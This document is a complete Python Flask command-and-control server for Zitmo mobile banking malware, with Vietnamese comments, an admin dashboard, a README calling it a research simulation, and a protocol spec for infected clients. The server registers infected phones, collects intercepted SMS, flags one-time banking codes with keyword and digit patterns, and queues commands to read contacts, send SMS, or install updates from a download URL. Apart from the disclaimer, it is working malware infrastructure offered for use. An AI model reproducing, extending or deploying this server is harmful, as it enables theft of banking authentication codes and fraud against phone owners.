from flask import Flask, request, jsonify
import sqlite3
import os
import time
import logging
from datetime import datetime

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='zitmo_cnc.log'
)

app = Flask(__name__)

# Đường dẫn đến database
DB_PATH = 'zitmo_data.db'

# Khởi tạo database
def init_db():
    if not os.path.exists(DB_PATH):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Bảng lưu thông tin thiết bị
        cursor.execute('''
            CREATE TABLE devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT UNIQUE,
                device_info TEXT,
                phone_number TEXT,
                operator TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP
            )
        ''')
        
        # Bảng lưu SMS bị chặn
        cursor.execute('''
            CREATE TABLE intercepted_sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                sender TEXT,
                message TEXT,
                timestamp TIMESTAMP,
                processed INTEGER DEFAULT 0,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        # Bảng lưu lệnh điều khiển
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command_type TEXT,
                command_data TEXT,
                timestamp TIMESTAMP,
                executed INTEGER DEFAULT 0,
                FOREIGN KEY (device_id) REFERENCES devices (device_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("Database đã được khởi tạo")

# Đăng ký thiết bị mới hoặc cập nhật thiết bị hiện có
@app.route('/register', methods=['POST'])
def register_device():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin thiết bị'}), 400
    
    device_id = data.get('device_id')
    device_info = data.get('device_info', '')
    phone_number = data.get('phone_number', '')
    operator = data.get('operator', '')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Kiểm tra xem thiết bị đã tồn tại chưa
        cursor.execute('SELECT device_id FROM devices WHERE device_id = ?', (device_id,))
        result = cursor.fetchone()
        
        if result:
            # Cập nhật thiết bị hiện có
            cursor.execute('''
                UPDATE devices 
                SET device_info = ?, phone_number = ?, operator = ?, last_seen = ?
                WHERE device_id = ?
            ''', (device_info, phone_number, operator, current_time, device_id))
            logging.info(f"Cập nhật thiết bị: {device_id}")
        else:
            # Thêm thiết bị mới
            cursor.execute('''
                INSERT INTO devices (device_id, device_info, phone_number, operator, first_seen, last_seen)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (device_id, device_info, phone_number, operator, current_time, current_time))
            logging.info(f"Đăng ký thiết bị mới: {device_id}")
            
        conn.commit()
        
        # Kiểm tra các lệnh đang chờ cho thiết bị
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi đăng ký thiết bị: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Nhận SMS bị chặn
@app.route('/intercepted_sms', methods=['POST'])
def receive_sms():
    data = request.json
    
    if not data or 'device_id' not in data or 'sender' not in data or 'message' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin SMS'}), 400
    
    device_id = data.get('device_id')
    sender = data.get('sender')
    message = data.get('message')
    timestamp = data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Cập nhật thời gian hoạt động của thiết bị
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
        
        # Lưu SMS bị chặn
        cursor.execute('''
            INSERT INTO intercepted_sms (device_id, sender, message, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, sender, message, timestamp))
        
        conn.commit()
        conn.close()
        
        # Kiểm tra SMS có chứa mTAN hay không
        contains_mtan = check_for_mtan(message)
        
        if contains_mtan:
            logging.info(f"Phát hiện mTAN từ thiết bị {device_id}: {message}")
            # Ở đây có thể thêm xử lý đặc biệt cho mTAN
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi nhận SMS: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Ping từ thiết bị
@app.route('/ping', methods=['POST'])
def ping():
    data = request.json
    
    if not data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu ID thiết bị'}), 400
    
    device_id = data.get('device_id')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Cập nhật thời gian hoạt động
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                     (current_time, device_id))
        
        # Kiểm tra lệnh đang chờ
        cursor.execute('''
            SELECT id, command_type, command_data 
            FROM commands 
            WHERE device_id = ? AND executed = 0
        ''', (device_id,))
        
        pending_commands = []
        for cmd in cursor.fetchall():
            pending_commands.append({
                'id': cmd[0],
                'type': cmd[1],
                'data': cmd[2]
            })
        
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'pending_commands': pending_commands
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi ping: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Báo cáo thực thi lệnh
@app.route('/command_executed', methods=['POST'])
def command_executed():
    data = request.json
    
    if not data or 'command_id' not in data or 'device_id' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin lệnh'}), 400
    
    command_id = data.get('command_id')
    device_id = data.get('device_id')
    result = data.get('result', '')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('UPDATE commands SET executed = 1 WHERE id = ? AND device_id = ?', 
                     (command_id, device_id))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Lệnh {command_id} đã được thực thi trên thiết bị {device_id}. Kết quả: {result}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi cập nhật trạng thái lệnh: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Thêm lệnh mới cho thiết bị
@app.route('/admin/add_command', methods=['POST'])
def add_command():
    # Trong thực tế, endpoint này cần được bảo vệ bằng xác thực
    data = request.json
    
    if not data or 'device_id' not in data or 'command_type' not in data:
        return jsonify({'status': 'error', 'message': 'Thiếu thông tin lệnh'}), 400
    
    device_id = data.get('device_id')
    command_type = data.get('command_type')
    command_data = data.get('command_data', '')
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (device_id, command_type, command_data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (device_id, command_type, command_data, current_time))
        
        conn.commit()
        conn.close()
        
        logging.info(f"Đã thêm lệnh mới cho thiết bị {device_id}: {command_type}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Lỗi khi thêm lệnh: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy danh sách thiết bị
@app.route('/admin/devices', methods=['GET'])
def get_devices():
    # Trong thực tế, endpoint này cần được bảo vệ bằng xác thực
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT * FROM devices
            ORDER BY last_seen DESC
        ''')
        
        devices = []
        for row in cursor.fetchall():
            devices.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'devices': devices
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy danh sách thiết bị: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API để lấy SMS đã chặn
@app.route('/admin/intercepted_sms', methods=['GET'])
def get_intercepted_sms():
    # Trong thực tế, endpoint này cần được bảo vệ bằng xác thực
    device_id = request.args.get('device_id')
    
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        if device_id:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                WHERE device_id = ?
                ORDER BY timestamp DESC
            ''', (device_id,))
        else:
            cursor.execute('''
                SELECT * FROM intercepted_sms
                ORDER BY timestamp DESC
            ''')
        
        sms_list = []
        for row in cursor.fetchall():
            sms_list.append(dict(row))
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'sms': sms_list
        })
        
    except Exception as e:
        logging.error(f"Lỗi khi lấy danh sách SMS: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Hàm kiểm tra mTAN trong tin nhắn
def check_for_mtan(message):
    # Danh sách từ khóa có thể liên quan đến mTAN
    mtan_keywords = [
        'mã xác thực', 'mã otp', 'mã giao dịch', 'mã bảo mật',
        'verification code', 'security code', 'authentication code',
        'mtan', 'one-time password', 'chuyển khoản'
    ]
    
    message_lower = message.lower()
    
    # Kiểm tra từ khóa
    for keyword in mtan_keywords:
        if keyword in message_lower:
            return True
    
    # Kiểm tra mẫu số (4-8 chữ số liên tiếp)
    import re
    if re.search(r'\b\d{4,8}\b', message):
        return True
    
    return False

# API để tạo bảng điều khiển admin đơn giản
@app.route('/admin', methods=['GET'])
def admin_dashboard():
    # Trong thực tế, endpoint này cần được bảo vệ bằng xác thực
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bảng điều khiển C&C Zitmo</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
            h1 { color: #333; }
            table { border-collapse: collapse; width: 100%; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
            .btn { background-color: #4CAF50; color: white; padding: 8px 16px; border: none; cursor: pointer; }
            .tab { overflow: hidden; border: 1px solid #ccc; background-color: #f1f1f1; }
            .tab button { background-color: inherit; float: left; border: none; outline: none; cursor: pointer; padding: 14px 16px; }
            .tab button:hover { background-color: #ddd; }
            .tab button.active { background-color: #ccc; }
            .tabcontent { display: none; padding: 6px 12px; border: 1px solid #ccc; border-top: none; }
        </style>
    </head>
    <body>
        <h1>Bảng điều khiển C&C Zitmo</h1>
        
        <div class="tab">
            <button class="tablinks" onclick="openTab(event, 'Devices')">Thiết bị</button>
            <button class="tablinks" onclick="openTab(event, 'SMS')">SMS đã chặn</button>
            <button class="tablinks" onclick="openTab(event, 'Commands')">Lệnh điều khiển</button>
        </div>
        
        <div id="Devices" class="tabcontent">
            <h2>Danh sách thiết bị</h2>
            <div id="devices-list"></div>
        </div>
        
        <div id="SMS" class="tabcontent">
            <h2>SMS đã chặn</h2>
            <div>
                <label for="device-filter">Thiết bị:</label>
                <select id="device-filter" onchange="loadSMS()">
                    <option value="">Tất cả</option>
                </select>
            </div>
            <div id="sms-list"></div>
        </div>
        
        <div id="Commands" class="tabcontent">
            <h2>Gửi lệnh mới</h2>
            <div>
                <label for="cmd-device">Thiết bị:</label>
                <select id="cmd-device">
                </select>
                <br><br>
                <label for="cmd-type">Loại lệnh:</label>
                <select id="cmd-type">
                    <option value="get_contacts">Lấy danh bạ</option>
                    <option value="get_sms">Lấy tin nhắn</option>
                    <option value="send_sms">Gửi tin nhắn</option>
                    <option value="update">Cập nhật</option>
                    <option value="uninstall">Gỡ cài đặt</option>
                </select>
                <br><br>
                <label for="cmd-data">Dữ liệu lệnh:</label>
                <textarea id="cmd-data" rows="4" cols="50"></textarea>
                <br><br>
                <button class="btn" onclick="sendCommand()">Gửi lệnh</button>
            </div>
            <h2>Lệnh đã gửi</h2>
            <div id="commands-list"></div>
        </div>
        
        <script>
            // Mở tab
            function openTab(evt, tabName) {
                var i, tabcontent, tablinks;
                tabcontent = document.getElementsByClassName("tabcontent");
                for (i = 0; i < tabcontent.length; i++) {
                    tabcontent[i].style.display = "none";
                }
                tablinks = document.getElementsByClassName("tablinks");
                for (i = 0; i < tablinks.length; i++) {
                    tablinks[i].className = tablinks[i].className.replace(" active", "");
                }
                document.getElementById(tabName).style.display = "block";
                evt.currentTarget.className += " active";
                
                if (tabName === "Devices") {
                    loadDevices();
                } else if (tabName === "SMS") {
                    loadSMS();
                } else if (tabName === "Commands") {
                    loadCommands();
                }
            }
            
            // Tải danh sách thiết bị
            function loadDevices() {
                fetch('/admin/devices')
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            let html = '<table>';
                            html += '<tr><th>ID</th><th>Thông tin</th><th>Số điện thoại</th><th>Nhà mạng</th><th>Lần đầu thấy</th><th>Lần cuối thấy</th></tr>';
                            
                            data.devices.forEach(device => {
                                html += `<tr>
                                    <td>${device.device_id}</td>
                                    <td>${device.device_info}</td>
                                    <td>${device.phone_number}</td>
                                    <td>${device.operator}</td>
                                    <td>${device.first_seen}</td>
                                    <td>${device.last_seen}</td>
                                </tr>`;
                            });
                            
                            html += '</table>';
                            document.getElementById('devices-list').innerHTML = html;
                            
                            // Cập nhật danh sách thiết bị trong dropdown
                            let deviceSelect = document.getElementById('device-filter');
                            let cmdDeviceSelect = document.getElementById('cmd-device');
                            
                            // Xóa tất cả các tùy chọn hiện tại trừ "Tất cả"
                            while (deviceSelect.options.length > 1) {
                                deviceSelect.remove(1);
                            }
                            
                            // Xóa tất cả các tùy chọn hiện tại
                            while (cmdDeviceSelect.options.length > 0) {
                                cmdDeviceSelect.remove(0);
                            }
                            
                            // Thêm thiết bị vào dropdown
                            data.devices.forEach(device => {
                                let option = document.createElement('option');
                                option.value = device.device_id;
                                option.text = device.device_id + (device.phone_number ? ` (${device.phone_number})` : '');
                                deviceSelect.add(option);
                                
                                let cmdOption = option.cloneNode(true);
                                cmdDeviceSelect.add(cmdOption);
                            });
                        }
                    });
            }
            
            // Tải danh sách SMS
            function loadSMS() {
                let deviceId = document.getElementById('device-filter').value;
                let url = '/admin/intercepted_sms';
                if (deviceId) {
                    url += `?device_id=${deviceId}`;
                }
                
                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            let html = '<table>';
                            html += '<tr><th>ID</th><th>Thiết bị</th><th>Người gửi</th><th>Nội dung</th><th>Thời gian</th></tr>';
                            
                            data.sms.forEach(sms => {
                                html += `<tr>
                                    <td>${sms.id}</td>
                                    <td>${sms.device_id}</td>
                                    <td>${sms.sender}</td>
                                    <td>${sms.message}</td>
                                    <td>${sms.timestamp}</td>
                                </tr>`;
                            });
                            
                            html += '</table>';
                            document.getElementById('sms-list').innerHTML = html;
                        }
                    });
            }
            
            // Tải danh sách lệnh
            function loadCommands() {
                // Trong thực tế, cần thêm API để lấy danh sách lệnh
                // Đây chỉ là mã giả để minh họa
                document.getElementById('commands-list').innerHTML = '<p>Chức năng này chưa được triển khai</p>';
            }
            
            // Gửi lệnh mới
            function sendCommand() {
                let deviceId = document.getElementById('cmd-device').value;
                let commandType = document.getElementById('cmd-type').value;
                let commandData = document.getElementById('cmd-data').value;
                
                if (!deviceId) {
                    alert('Vui lòng chọn thiết bị');
                    return;
                }
                
                fetch('/admin/add_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        device_id: deviceId,
                        command_type: commandType,
                        command_data: commandData
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert('Lệnh đã được gửi thành công');
                        document.getElementById('cmd-data').value = '';
                    } else {
                        alert('Lỗi: ' + data.message);
                    }
                });
            }
            
            // Mặc định mở tab Thiết bị khi tải trang
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementsByClassName('tablinks')[0].click();
            });
        </script>
    </body>
    </html>
    '''
    return html

# Khởi tạo database và chạy server
if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)


# File: README.md
'''
# Mô phỏng máy chủ C&C cho Zitmo
**Lưu ý quan trọng**: Đây là mã nguồn mô phỏng chỉ dành cho mục đích nghiên cứu và giáo dục. Không sử dụng cho mục đích độc hại.

## Mô tả
Đây là mô phỏng đơn giản của máy chủ Command & Control (C&C) dùng cho Zitmo (Zeus-in-the-Mobile). Mã nguồn này được thiết kế để minh họa cách thức hoạt động của máy chủ C&C trong việc thu thập dữ liệu từ thiết bị bị nhiễm và gửi lệnh điều khiển.

## Chức năng
- Đăng ký và quản lý thiết bị bị nhiễm
- Thu nhận SMS bị chặn từ thiết bị
- Gửi lệnh điều khiển đến thiết bị
- Bảng điều khiển quản trị đơn giản

## Yêu cầu
- Python 3.6+
- Flask
- SQLite3

## Cài đặt
```
pip install flask
```

## Sử dụng
Chạy máy chủ:
```
python cnc_server.py
```

Máy chủ sẽ khởi động trên cổng 5000. Truy cập bảng điều khiển quản trị tại:
```
http://localhost:5000/admin
```

## API Endpoints
- `/register` - Đăng ký thiết bị mới hoặc cập nhật thiết bị
- `/intercepted_sms` - Nhận SMS bị chặn từ thiết bị
- `/ping` - Ping từ thiết bị và nhận lệnh mới
- `/command_executed` - Báo cáo kết quả thực thi lệnh
- `/admin/add_command` - Thêm lệnh mới cho thiết bị
- `/admin/devices` - Lấy danh sách thiết bị
- `/admin/intercepted_sms` - Lấy danh sách SMS đã chặn

## Lưu ý bảo mật
Trong môi trường thực tế, tất cả các endpoint cần được bảo vệ bằng xác thực và mã hóa. Mã nguồn này cố tình đơn giản hóa nhiều khía cạnh bảo mật để dễ hiểu.
'''

# File: client_protocol.md
'''
# Giao thức giao tiếp giữa Zitmo và máy chủ C&C

Tài liệu này mô tả cách thức giao tiếp giữa client Zitmo trên thiết bị di động và máy chủ C&C.

## 1. Đăng ký thiết bị

**Endpoint:** `/register`
**Method:** POST
**Body:**
```json
{
    "device_id": "unique_device_identifier",
    "device_info": "thông tin thiết bị (model, OS version...)",
    "phone_number": "số điện thoại của thiết bị",
    "operator": "nhà mạng di động"
}
```
**Response:**
```json
{
    "status": "success",
    "pending_commands": [
        {
            "id": command_id,
            "type": "command_type",
            "data": "command_data"
        }
    ]
}
```

## 2. Gửi SMS bị chặn

**Endpoint:** `/intercepted_sms`
**Method:** POST
**Body:**
```json
{
    "device_id": "unique_device_identifier",
    "sender": "người gửi SMS",
    "message": "nội dung SMS",
    "timestamp": "thời gian nhận (YYYY-MM-DD HH:MM:SS)"
}
```
**Response:**
```json
{
    "status": "success"
}
```

## 3. Ping và nhận lệnh mới

**Endpoint:** `/ping`
**Method:** POST
**Body:**
```json
{
    "device_id": "unique_device_identifier"
}
```
**Response:**
```json
{
    "status": "success",
    "pending_commands": [
        {
            "id": command_id,
            "type": "command_type",
            "data": "command_data"
        }
    ]
}
```

## 4. Báo cáo thực thi lệnh

**Endpoint:** `/command_executed`
**Method:** POST
**Body:**
```json
{
    "device_id": "unique_device_identifier",
    "command_id": command_id,
    "result": "kết quả thực thi lệnh"
}
```
**Response:**
```json
{
    "status": "success"
}
```

## Các loại lệnh hỗ trợ

| Loại lệnh | Mô tả | Dữ liệu lệnh |
|-----------|-------|--------------|
| get_contacts | Lấy danh bạ | {} |
| get_sms | Lấy tin nhắn | {"limit": số_lượng} |
| send_sms | Gửi tin nhắn | {"to": "người_nhận", "message": "nội_dung"} |
| update | Cập nhật ứng dụng | {"url": "đường_dẫn_tải"} |
| uninstall | Gỡ cài đặt | {} |

'''
